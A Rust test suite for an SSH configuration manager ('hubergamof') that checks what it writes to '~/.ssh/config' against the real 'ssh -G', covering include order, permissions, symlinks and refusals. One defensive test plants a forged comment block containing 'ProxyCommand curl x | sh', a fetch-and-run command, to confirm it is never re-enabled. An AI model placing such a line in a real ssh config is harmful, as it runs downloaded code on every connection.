//! The SSH hub and the files it writes, checked against the real `ssh`
//! (`ssh -G` prints the configuration it would use, without connecting): what
//! is written must be read back by `ssh` as it was meant.
//!
//! `ssh` finds the home folder of the user in the system, not in `$HOME`, so
//! the include (`~/…`) cannot lead to the folder of a test: the file that
//! includes is read through a copy whose `~/` is the folder of the test.

use std::collections::HashMap;
use std::fs;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;

use hubergamof_protocol::{SshConfig, SshHost};

use super::*;
use crate::machine::FileError;
use crate::testing::builtin_registry;

struct Fixture {
    config_dir: tempfile::TempDir,
    home: tempfile::TempDir,
    hub: SshConfigHub,
}

/// `ssh` must be installed to run these tests: it is the judge of what is written.
fn require_ssh() {
    let found = Command::new("ssh").arg("-V").output();
    assert!(
        found.is_ok(),
        "the ssh program is needed to run these tests"
    );
}

fn fixture() -> Fixture {
    require_ssh();
    let config_dir = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    let store = ConfigStore::new(config_dir.path(), Arc::new(builtin_registry()));
    let hub = SshConfigHub::new(store, Some(SshFiles::new(home.path().to_owned())));
    Fixture {
        config_dir,
        home,
        hub,
    }
}

fn read(home: &Path, relative: &str) -> String {
    fs::read_to_string(home.join(relative)).unwrap()
}

fn mode(path: &Path) -> u32 {
    fs::metadata(path).unwrap().permissions().mode() & 0o777
}

fn host(alias: &str) -> SshHost {
    SshHost {
        alias: alias.into(),
        host_name: String::new(),
        user: String::new(),
        port: None,
        identity_file: String::new(),
        proxy_jump: String::new(),
        forward_agent: false,
        enabled: true,
    }
}

fn server(alias: &str, host_name: &str, user: &str) -> SshHost {
    let mut found = host(alias);
    found.host_name = host_name.into();
    found.user = user.into();
    found
}

async fn saved(fixture: &Fixture, change: impl FnOnce(&mut SshConfig)) -> SshConfig {
    let mut config = fixture.hub.refresh().await.unwrap().config;
    change(&mut config);
    fixture.hub.update(config).await.unwrap();
    fixture.hub.refresh().await.unwrap().config
}

/// What `ssh` would use to reach `alias` with the configuration in `file`.
fn ssh_reads(file: &Path, alias: &str) -> HashMap<String, Vec<String>> {
    let output = Command::new("ssh")
        .arg("-F")
        .arg(file)
        .args(["-G", alias])
        .env_clear()
        .env("PATH", std::env::var_os("PATH").unwrap())
        .output()
        .unwrap();
    assert!(output.status.success(), "{output:?}");
    let mut options: HashMap<String, Vec<String>> = HashMap::new();
    for line in String::from_utf8(output.stdout).unwrap().lines() {
        if let Some((key, value)) = line.split_once(' ') {
            options
                .entry(key.to_owned())
                .or_default()
                .push(value.to_owned());
        }
    }
    options
}

/// What `ssh` reads for `alias` from `~/.ssh/config` of the test home, the
/// include leading to the test home instead of the real one.
fn ssh_reads_home(home: &Path, alias: &str) -> HashMap<String, Vec<String>> {
    let text =
        read(home, ".ssh/config").replace("Include ~/", &format!("Include {}/", home.display()));
    let copy = home.join("effective_config");
    fs::write(&copy, text).unwrap();
    ssh_reads(&copy, alias)
}

fn first(options: &HashMap<String, Vec<String>>, key: &str) -> Option<String> {
    options.get(key).and_then(|values| values.first().cloned())
}

#[tokio::test]
async fn ssh_reads_back_what_is_written() {
    let fixture = fixture();
    let home = fixture.home.path();
    saved(&fixture, |config| {
        let mut full = server("prod", "10.0.0.1", "deploy");
        full.port = Some(2222);
        full.identity_file = "~/.ssh/keys/work".into();
        full.proxy_jump = "me@bastion:2200,other".into();
        full.forward_agent = true;
        let mut off = server("off", "192.0.2.9", "x");
        off.enabled = false;
        config.hosts = vec![full, host("bare"), off];
    })
    .await;

    let managed = home.join(".config/hubergamof/ssh_config");
    let prod = ssh_reads(&managed, "prod");
    assert_eq!(first(&prod, "hostname").as_deref(), Some("10.0.0.1"));
    assert_eq!(first(&prod, "user").as_deref(), Some("deploy"));
    assert_eq!(first(&prod, "port").as_deref(), Some("2222"));
    assert!(
        first(&prod, "identityfile")
            .unwrap()
            .ends_with("/.ssh/keys/work")
    );
    assert_eq!(
        first(&prod, "proxyjump").as_deref(),
        Some("me@bastion:2200,other")
    );
    assert_eq!(first(&prod, "forwardagent").as_deref(), Some("yes"));
    assert_eq!(
        first(&ssh_reads(&managed, "bare"), "hostname").as_deref(),
        Some("bare")
    );
    assert_eq!(
        first(&ssh_reads(&managed, "off"), "hostname").as_deref(),
        Some("off"),
        "a disabled host is not on the computer"
    );
    assert_eq!(mode(&managed), 0o600);
    assert_eq!(mode(&home.join(".config/hubergamof")), 0o700);
}

#[tokio::test]
async fn the_include_comes_first_so_that_the_hosts_of_hubergamof_win() {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host *\n\tUser everyone\n\nHost prod\n\tHostName elsewhere\n\tUser them\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();

    saved(&fixture, |config| {
        config.hosts = vec![server("web", "10.0.0.2", "ada")];
    })
    .await;
    let content = read(home, ".ssh/config");
    assert!(
        content.starts_with("# >>> hubergamof ssh >>>\nInclude ~/.config/hubergamof/ssh_config\n")
    );
    assert!(content.ends_with(original));

    let web = ssh_reads_home(home, "web");
    assert_eq!(first(&web, "hostname").as_deref(), Some("10.0.0.2"));
    assert_eq!(
        first(&web, "user").as_deref(),
        Some("ada"),
        "before `Host *`: ours wins"
    );
    let prod = ssh_reads_home(home, "prod");
    assert_eq!(
        first(&prod, "hostname").as_deref(),
        Some("elsewhere"),
        "the others are as they were"
    );

    saved(&fixture, |config| config.hosts.clear()).await;
    assert_eq!(read(home, ".ssh/config"), original);
    assert!(!home.join(".config/hubergamof/ssh_config").exists());
}

#[tokio::test]
async fn a_configuration_that_did_not_exist_is_created_private_then_removed() {
    let fixture = fixture();
    let home = fixture.home.path();
    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    assert_eq!(mode(&home.join(".ssh")), 0o700);
    assert_eq!(mode(&home.join(".ssh/config")), 0o600);

    saved(&fixture, |config| config.hosts.clear()).await;
    assert!(!home.join(".ssh/config").exists());
}

#[tokio::test]
async fn an_empty_configuration_of_the_user_is_never_removed() {
    let fixture = fixture();
    let home = fixture.home.path();
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), "").unwrap();
    saved(&fixture, |_| ()).await;
    assert!(home.join(".ssh/config").is_file());

    // Written then switched off: an empty file and no file are the same to
    // `ssh`, so the file may go with the block, but never keeps it.
    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    saved(&fixture, |config| config.hosts.clear()).await;
    let left = fs::read_to_string(home.join(".ssh/config")).unwrap_or_default();
    assert_eq!(left.trim(), "");
}

#[tokio::test]
async fn the_include_goes_back_first_when_the_person_moved_it_and_is_never_twice() {
    let fixture = fixture();
    let home = fixture.home.path();
    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    let block = read(home, ".ssh/config");
    fs::write(
        home.join(".ssh/config"),
        format!("Host x\n\tUser u\n{block}"),
    )
    .unwrap();

    saved(&fixture, |config| config.hosts.push(host("b"))).await;
    let content = read(home, ".ssh/config");
    assert!(content.starts_with("# >>> hubergamof ssh >>>"));
    assert_eq!(content.matches("hubergamof ssh >>>").count(), 1);
    assert!(content.ends_with("Host x\n\tUser u\n"));
}

#[tokio::test]
async fn a_host_taken_over_is_commented_out_where_it_came_from_and_really_switches_off() {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host prod\n\tHostName old.example.org\n\tUser olduser\n\nHost web\n\tHostName web.example.org\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();

    saved(&fixture, |config| {
        config.hosts = vec![server("prod", "new.example.org", "ada")];
    })
    .await;
    let content = read(home, ".ssh/config");
    assert!(
        content
            .contains("#hubergamof-off# Host prod\n#hubergamof-off# \tHostName old.example.org\n")
    );
    assert!(content.contains("\nHost web\n\tHostName web.example.org\n"));
    let prod = ssh_reads_home(home, "prod");
    assert_eq!(first(&prod, "hostname").as_deref(), Some("new.example.org"));
    assert_eq!(first(&prod, "user").as_deref(), Some("ada"));

    // Off: nothing defines it any more, which is the point.
    saved(&fixture, |config| config.hosts[0].enabled = false).await;
    assert_eq!(
        first(&ssh_reads_home(home, "prod"), "hostname").as_deref(),
        Some("prod")
    );
    assert_eq!(
        first(&ssh_reads_home(home, "web"), "hostname").as_deref(),
        Some("web.example.org")
    );

    // Removed from the configuration: the original comes back.
    saved(&fixture, |config| config.hosts.clear()).await;
    assert_eq!(read(home, ".ssh/config"), original);
    assert_eq!(
        first(&ssh_reads_home(home, "prod"), "hostname").as_deref(),
        Some("old.example.org")
    );
}

#[tokio::test]
async fn a_host_that_is_off_from_the_start_is_commented_out_with_no_include() {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host prod\n\tUser u\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();

    saved(&fixture, |config| {
        let mut off = host("prod");
        off.enabled = false;
        config.hosts = vec![off];
    })
    .await;
    let content = read(home, ".ssh/config");
    assert!(!content.contains("hubergamof ssh"));
    assert!(content.contains("#hubergamof-off# Host prod"));

    saved(&fixture, |config| config.hosts.clear()).await;
    assert_eq!(read(home, ".ssh/config"), original);
}

#[tokio::test]
async fn a_marker_from_elsewhere_never_switches_a_program_on() {
    let fixture = fixture();
    let home = fixture.home.path();
    let forged = "#hubergamof-off# Host evil\n#hubergamof-off# \tProxyCommand curl x | sh\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), forged).unwrap();
    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    assert!(read(home, ".ssh/config").ends_with(forged));
    assert_eq!(
        fs::read_to_string(home.join(".ssh/config"))
            .unwrap()
            .matches("\nProxyCommand")
            .count(),
        0
    );
}

#[tokio::test]
async fn the_hosts_found_are_listed_and_what_hubergamof_wrote_is_not() {
    let fixture = fixture();
    let home = fixture.home.path();
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(
        home.join(".ssh/config"),
        "Host web\n\tHostName web.example.org\n\tUser ada\n\nHost tunnel\n\tProxyCommand nc %h %p\n",
    )
    .unwrap();
    let snapshot = fixture.hub.refresh().await.unwrap();
    let aliases: Vec<_> = snapshot
        .system_hosts
        .iter()
        .map(|h| h.alias.as_str())
        .collect();
    assert_eq!(aliases, ["web", "tunnel"]);
    assert_eq!(snapshot.system_hosts[1].other_options, ["proxycommand"]);

    saved(&fixture, |config| config.hosts = vec![host("mine")]).await;
    let snapshot = fixture.hub.refresh().await.unwrap();
    let aliases: Vec<_> = snapshot
        .system_hosts
        .iter()
        .map(|h| h.alias.as_str())
        .collect();
    assert_eq!(aliases, ["web", "tunnel"], "the include is not a host");
}

#[tokio::test]
async fn a_configuration_that_cannot_be_rewritten_is_refused_by_its_reason_and_left_alone() {
    type Prepare = fn(&Path);
    type Expected = fn(&FileError) -> bool;
    let cases: [(&str, Prepare, Expected); 4] = [
        (
            "dangling link",
            |home| symlink(home.join("nowhere"), home.join(".ssh/config")).unwrap(),
            |error| matches!(error, FileError::DanglingLink(_)),
        ),
        (
            "hard link",
            |home| {
                fs::write(home.join("other"), "Host x\n").unwrap();
                fs::hard_link(home.join("other"), home.join(".ssh/config")).unwrap();
            },
            |error| matches!(error, FileError::HardLinked(_)),
        ),
        (
            "not text",
            |home| fs::write(home.join(".ssh/config"), [0xff, 0xfe]).unwrap(),
            |error| matches!(error, FileError::NotUtf8(_)),
        ),
        (
            "damaged block",
            |home| {
                fs::write(
                    home.join(".ssh/config"),
                    "# >>> hubergamof ssh >>>\nInclude x\n",
                )
                .unwrap();
            },
            |error| matches!(error, FileError::BrokenBlock(_)),
        ),
    ];
    for (what, prepare, expected) in cases {
        let fixture = fixture();
        let home = fixture.home.path();
        fs::create_dir_all(home.join(".ssh")).unwrap();
        prepare(home);
        let before = fs::read(home.join(".ssh/config")).ok();
        let mut config = fixture.hub.refresh().await.unwrap().config;
        config.hosts = vec![host("a")];
        let error = fixture.hub.update(config).await.unwrap_err();
        assert!(
            matches!(&error, SshError::Apply(SshFilesError::File(reason)) if expected(reason)),
            "{what}: {error}"
        );
        assert_eq!(fs::read(home.join(".ssh/config")).ok(), before, "{what}");
        assert_eq!(
            fixture.hub.refresh().await.unwrap().config.revision,
            1,
            "{what}: saved all the same"
        );
    }
}

#[tokio::test]
async fn a_configuration_linked_to_a_dotfiles_repository_keeps_its_link() {
    let fixture = fixture();
    let home = fixture.home.path();
    let dotfiles = tempfile::tempdir().unwrap();
    let real = dotfiles.path().join("ssh_config");
    let original = "Host web\n\tUser w\n";
    fs::write(&real, original).unwrap();
    fs::create_dir_all(home.join(".ssh")).unwrap();
    symlink(&real, home.join(".ssh/config")).unwrap();

    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    assert!(
        fs::symlink_metadata(home.join(".ssh/config"))
            .unwrap()
            .file_type()
            .is_symlink()
    );
    assert!(
        fs::read_to_string(&real)
            .unwrap()
            .starts_with("# >>> hubergamof ssh >>>")
    );

    saved(&fixture, |config| config.hosts.clear()).await;
    assert!(
        fs::symlink_metadata(home.join(".ssh/config"))
            .unwrap()
            .file_type()
            .is_symlink()
    );
    assert_eq!(fs::read_to_string(&real).unwrap(), original);
}

#[tokio::test]
async fn a_ssh_folder_that_is_a_link_is_followed_when_it_holds_a_configuration_and_refused_when_not()
 {
    let fixture = fixture();
    let home = fixture.home.path();
    let elsewhere = tempfile::tempdir().unwrap();
    fs::write(elsewhere.path().join("config"), "Host web\n").unwrap();
    symlink(elsewhere.path(), home.join(".ssh")).unwrap();
    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    assert!(
        fs::read_to_string(elsewhere.path().join("config"))
            .unwrap()
            .contains("hubergamof ssh")
    );

    let other = self::fixture();
    symlink(
        tempfile::tempdir().unwrap().path(),
        other.home.path().join(".ssh"),
    )
    .unwrap();
    let mut config = other.hub.refresh().await.unwrap().config;
    config.hosts = vec![host("a")];
    let error = other.hub.update(config).await.unwrap_err();
    assert!(
        matches!(
            error,
            SshError::Apply(SshFilesError::File(FileError::NotRegular(_)))
        ),
        "{error}"
    );
}

#[tokio::test]
async fn a_ssh_folder_that_is_a_file_is_refused_and_the_file_left_alone() {
    let fixture = fixture();
    let home = fixture.home.path();
    fs::write(home.join(".ssh"), "not a folder").unwrap();
    let mut config = fixture.hub.refresh().await.unwrap().config;
    config.hosts = vec![host("a")];
    assert!(fixture.hub.update(config).await.is_err());
    assert_eq!(read(home, ".ssh"), "not a folder");
    assert_eq!(fixture.hub.refresh().await.unwrap().config.revision, 1);
}

#[tokio::test]
async fn a_ssh_folder_that_is_too_open_is_tightened_when_the_configuration_is_created() {
    let fixture = fixture();
    let home = fixture.home.path();
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::set_permissions(home.join(".ssh"), fs::Permissions::from_mode(0o755)).unwrap();
    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    assert_eq!(mode(&home.join(".ssh")), 0o700);
}

#[tokio::test]
async fn the_folder_of_the_managed_file_must_be_a_folder() {
    let fixture = fixture();
    let home = fixture.home.path();
    fs::create_dir_all(home.join(".config")).unwrap();
    fs::write(home.join(".config/hubergamof"), "x").unwrap();
    let mut config = fixture.hub.refresh().await.unwrap().config;
    config.hosts = vec![host("a")];
    let error = fixture.hub.update(config).await.unwrap_err();
    assert!(
        matches!(
            error,
            SshError::Apply(SshFilesError::File(FileError::NotRegular(_)))
        ),
        "{error}"
    );
}

#[tokio::test]
async fn an_invalid_saved_configuration_takes_what_it_had_applied_with_it() {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host prod\n\tUser u\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();
    saved(&fixture, |config| {
        config.hosts = vec![server("prod", "new.example.org", "ada")];
    })
    .await;

    fs::write(fixture.config_dir.path().join("ssh.json"), "{ broken").unwrap();
    let snapshot = fixture.hub.refresh().await.unwrap();
    assert_eq!(snapshot.config, SshConfig::empty());
    assert_eq!(read(home, ".ssh/config"), original);
    assert!(!home.join(".config/hubergamof/ssh_config").exists());
}

#[tokio::test]
async fn the_demo_works_in_a_temporary_home_and_lists_its_hosts() {
    let config_dir = tempfile::tempdir().unwrap();
    let store = ConfigStore::new(config_dir.path(), Arc::new(builtin_registry()));
    let hub = SshConfigHub::demo(store).unwrap();
    let snapshot = hub.refresh().await.unwrap();
    let aliases: Vec<_> = snapshot
        .system_hosts
        .iter()
        .map(|h| h.alias.as_str())
        .collect();
    assert_eq!(aliases, ["demo-server", "demo-tunnel"]);

    let home: PathBuf = hub.target().unwrap().home().to_owned();
    assert!(home.starts_with(std::env::temp_dir()));
    assert_ne!(Some(home.clone()), std::env::home_dir());
    let mut config = snapshot.config;
    config.hosts = vec![host("mine")];
    hub.update(config).await.unwrap();
    assert!(read(&home, ".ssh/config").contains("hubergamof ssh"));
}

#[derive(serde::Deserialize)]
struct Case {
    value: String,
    valid: bool,
}

#[derive(serde::Deserialize)]
struct Cases {
    aliases: Vec<Case>,
    users: Vec<Case>,
    #[serde(rename = "hostNames")]
    host_names: Vec<Case>,
    #[serde(rename = "identityFiles")]
    identity_files: Vec<Case>,
    #[serde(rename = "proxyJumps")]
    proxy_jumps: Vec<Case>,
}

/// What the contract accepts must not make `ssh` refuse the configuration: it
/// is read for every connection of the computer, an included file with one bad
/// option stops them all.
#[tokio::test]
async fn every_value_the_contract_accepts_is_read_by_ssh_without_an_error() {
    let cases: Cases = serde_json::from_str(include_str!(
        "../../../../protocol/tests/fixtures/ssh-validation.json"
    ))
    .unwrap();
    let valid = |cases: &[Case]| -> Vec<String> {
        cases
            .iter()
            .filter(|case| case.valid)
            .map(|case| case.value.clone())
            .collect()
    };
    let mut hosts = Vec::new();
    for alias in valid(&cases.aliases) {
        hosts.push(host(&alias));
    }
    for (index, user) in valid(&cases.users).into_iter().enumerate() {
        let mut found = host(&format!("user{index}"));
        found.user = user;
        hosts.push(found);
    }
    for (index, name) in valid(&cases.host_names).into_iter().enumerate() {
        let mut found = host(&format!("name{index}"));
        found.host_name = name;
        hosts.push(found);
    }
    for (index, path) in valid(&cases.identity_files).into_iter().enumerate() {
        let mut found = host(&format!("key{index}"));
        found.identity_file = path;
        hosts.push(found);
    }
    for (index, jumps) in valid(&cases.proxy_jumps).into_iter().enumerate() {
        let mut found = host(&format!("jump{index}"));
        found.proxy_jump = jumps;
        hosts.push(found);
    }
    assert!(hosts.len() <= hubergamof_protocol::MAX_SSH_HOSTS);

    let fixture = fixture();
    let config = saved(&fixture, |config| config.hosts = hosts).await;
    let managed = fixture.home.path().join(".config/hubergamof/ssh_config");
    // `ssh -G` fails on a configuration it cannot read, for any host.
    let options = ssh_reads(&managed, "unrelated");
    assert_eq!(first(&options, "hostname").as_deref(), Some("unrelated"));
    assert_eq!(
        config.hosts.len(),
        fixture.hub.refresh().await.unwrap().config.hosts.len()
    );
}

#[tokio::test]
async fn a_name_used_by_a_host_with_options_hubergamof_does_not_manage_is_refused_and_nothing_is_lost()
 {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host work\n\tHostName w.example.org\n\tProxyCommand nc -X 5 %h %p\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();

    let mut config = fixture.hub.refresh().await.unwrap().config;
    config.hosts = vec![host("work")];
    let error = fixture.hub.update(config).await.unwrap_err();
    assert!(
        matches!(error, SshError::Apply(SshFilesError::NameInUse(ref names)) if *names == ["work"]),
        "{error}"
    );
    assert!(error.to_string().contains("`work`"));
    assert_eq!(
        read(home, ".ssh/config"),
        original,
        "its ProxyCommand is not lost"
    );
    assert!(
        !home.join(".config/hubergamof/ssh_config").exists(),
        "nothing was written"
    );

    // Another name is fine, and the host stays listed as one that cannot be taken.
    saved(&fixture, |config| config.hosts = vec![host("other")]).await;
    let snapshot = fixture.hub.refresh().await.unwrap();
    assert_eq!(snapshot.system_hosts[0].other_options, ["proxycommand"]);
    assert!(read(home, ".ssh/config").ends_with(original));
}

#[tokio::test]
async fn a_host_switched_off_is_removed_even_when_the_configuration_of_the_user_cannot_be_rewritten()
 {
    let fixture = fixture();
    let home = fixture.home.path();
    saved(&fixture, |config| config.hosts = vec![host("prod")]).await;
    let managed = home.join(".config/hubergamof/ssh_config");
    assert!(managed.is_file());

    fs::write(home.join(".ssh/config"), [0xff, 0xfe]).unwrap();
    let mut config = fixture.hub.refresh().await.unwrap().config;
    config.hosts[0].enabled = false;
    let error = fixture.hub.update(config).await.unwrap_err();
    assert!(
        matches!(error, SshError::Apply(SshFilesError::File(_))),
        "{error}"
    );
    assert!(
        !managed.exists(),
        "the Include of a missing file does nothing: the host is off"
    );
}

#[tokio::test]
async fn a_host_with_a_comment_after_its_name_is_taken_over_and_really_switches_off() {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host prod # the production one\n\tHostName old.example.org\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();
    saved(&fixture, |config| {
        let mut off = host("prod");
        off.enabled = false;
        config.hosts = vec![off];
    })
    .await;
    assert_eq!(
        first(&ssh_reads_home(home, "prod"), "hostname").as_deref(),
        Some("prod")
    );
    saved(&fixture, |config| config.hosts.clear()).await;
    assert_eq!(read(home, ".ssh/config"), original);
}
